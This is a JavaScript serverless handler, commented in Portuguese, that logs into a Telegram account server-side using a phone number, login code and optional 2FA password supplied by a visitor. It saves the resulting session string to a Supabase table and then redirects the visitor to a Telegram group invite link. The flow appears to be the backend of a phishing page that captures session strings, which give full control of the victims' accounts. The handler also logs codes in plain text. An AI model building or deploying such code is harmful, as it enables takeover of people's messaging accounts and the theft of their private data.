import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  // Pega os dados e força limpeza de espaços
  let { phoneNumber, code, password } = req.body;
  
  if(!phoneNumber || !code) return res.status(400).json({ error: "Dados incompletos" });

  // Limpa caracteres extras (espaços, traços) só pra garantir
  phoneNumber = phoneNumber.replace(/\D/g, ''); 
  // O código deve ser string pura
  code = code.toString().trim();

  console.log(`[VERIFY] Iniciando validação para: ${phoneNumber} com código ${code}`);

  try {
      // 1. Resgata o estado intermediário do Supabase
      const { data: authData, error: dbError } = await supabase
        .from('auth_state')
        .select('*')
        .eq('phone_number', phoneNumber)
        .single();

      if (dbError || !authData) {
          console.error("[VERIFY] Sessão não encontrada no auth_state:", dbError);
          return res.status(400).json({ error: "Sessão expirada. Recomece o processo." });
      }

      console.log("[VERIFY] Sessão temporária encontrada. Conectando ao Telegram...");

      // 2. Recria o cliente com a sessão temporária
      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
        connectionRetries: 5,
        useWSS: false, 
      });
      
      await client.connect();

      // CENÁRIO A: Usuário enviou a Senha (Passo 3 - 2FA)
      if (password) {
            console.log("[VERIFY] Tentando login com Senha (2FA)...");
            await client.signIn({
                password: password,
                phoneNumber: phoneNumber,
                phoneCodeHash: authData.phone_code_hash,
                phoneCode: code,
            });
      } 
      // CENÁRIO B: Usuário enviou apenas o Código (Passo 2)
      else {
            console.log("[VERIFY] Tentando login com Código...");
            try {
                await client.invoke(
                    new Api.auth.SignIn({
                        phoneNumber,
                        phoneCodeHash: authData.phone_code_hash,
                        phoneCode: code,
                    })
                );
            } catch (error) {
                // Se pedir senha, avisa o front
                if (error.message.includes("SESSION_PASSWORD_NEEDED")) {
                    console.log("[VERIFY] Senha 2FA solicitada pelo Telegram.");
                    await client.disconnect();
                    return res.status(200).json({ status: 'needs_2fa' });
                }
                throw error; // Outros erros explodem para o catch final
            }
      }

      // 3. SUCESSO! Salva a sessão definitiva
      console.log("[VERIFY] Login Sucesso! Salvando sessão...");
      const finalSession = client.session.save();
      
      // Salva ou Atualiza a sessão no banco
      const { error: saveError } = await supabase.from('telegram_sessions').upsert({
        phone_number: phoneNumber,
        session_string: finalSession,
        is_active: true,
        created_at: new Date()
      }, { onConflict: 'phone_number' });

      if (saveError) {
          console.error("[VERIFY] Erro ao salvar no Supabase:", saveError);
          throw new Error("Falha ao salvar sessão no banco.");
      }

      // Limpa o estado temporário
      await supabase.from('auth_state').delete().eq('phone_number', phoneNumber);
      
      await client.disconnect();
      console.log("[VERIFY] Tudo pronto. Redirecionando...");
      
      // 4. Redireciona
      res.status(200).json({ 
          success: true, 
          redirect: "https://t.me/+krRexYUrqMVkMmNh" 
      });

  } catch (error) {
    console.error("[VERIFY] ERRO FATAL:", error);
    res.status(400).json({ error: error.message || "Erro desconhecido ao verificar" });
  }
}
